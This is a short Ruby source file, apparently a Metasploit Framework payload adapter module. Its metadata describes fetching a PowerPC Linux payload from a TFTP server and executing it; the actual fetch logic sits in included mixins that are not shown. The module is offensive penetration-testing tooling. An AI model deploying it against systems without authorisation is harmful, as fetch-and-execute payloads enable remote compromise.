##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::TFTP
  include Msf::Payload::Adapter::Fetch::LinuxOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TFTP Fetch',
        'Description' => 'Fetch and execute an PPC payload from an TFTP server.',
        'Author' => ['Brendan Watters', 'Spencer McIntyre'],
        'Platform' => 'linux',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_PPC,
        'AdaptedPlatform' => 'linux'
      )
    )
  end
end
